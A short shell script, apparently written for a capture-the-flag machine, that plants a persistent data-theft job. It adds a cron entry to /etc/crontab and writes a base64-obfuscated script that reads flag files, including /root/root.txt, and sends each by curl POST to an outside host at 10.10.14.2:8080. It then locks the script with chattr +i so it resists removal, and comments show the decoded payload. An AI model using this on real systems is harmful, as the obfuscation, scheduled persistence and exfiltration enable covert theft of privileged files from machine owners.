# a crontjob that reads the flag and sends it to the server


# create a cronjob that runs the script every 5 minutes
echo "*/5 * * * * /opt/flag_job.sh" >> /etc/crontab

# create the /opt/flag_job.sh script
echo IyEvYmluL2Jhc2gKRkxBRz0kKGNhdCAvb3B0L2ZsYWcudHh0KQpVU0VSX0ZMQUc9JChjYXQgL2hvbWUvdXNlci91c2VyLnR4dCkKUk9PVF9GTEFHPSQoY2F0IC9yb290L3Jvb3QudHh0KQoKIyBzZW5kIHRoZSBmbGFnIHRvIHRoZSBzZXJ2ZXIKY3VybCAtWCBQT1NUIC1kICJmbGFnPSRGTEFHIiBodHRwOi8vMTAuMTAuMTQuMjo4MDgwL2ZsYWcgCmN1cmwgLVggUE9TVCAtZCAiZmxhZz0kVVNFUl9GTEFHIiBodHRwOi8vMTAuMTAuMTQuMjo4MDgwL2ZsYWcKY3VybCAtWCBQT1NUIC1kICJmbGFnPSRST09UX0ZMQUciIGh0dHA6Ly8xMC4xMC4xNC4yOjgwODAvZmxhZwo= | base64 -d > /opt/flag_job.sh

# #!/bin/bash
# FLAG=$(cat /opt/flag.txt)
# USER_FLAG=$(cat /home/user/user.txt)
# ROOT_FLAG=$(cat /root/root.txt)

# # send the flag to the server
# curl -X POST -d "flag=$FLAG" http://10.10.14.2:8080/flag 
# curl -X POST -d "flag=$USER_FLAG" http://10.10.14.2:8080/flag
# curl -X POST -d "flag=$ROOT_FLAG" http://10.10.14.2:8080/flag


# make the script executable
chmod +x /opt/flag_job.sh

# make script immutable
chattr +i /opt/flag_job.sh

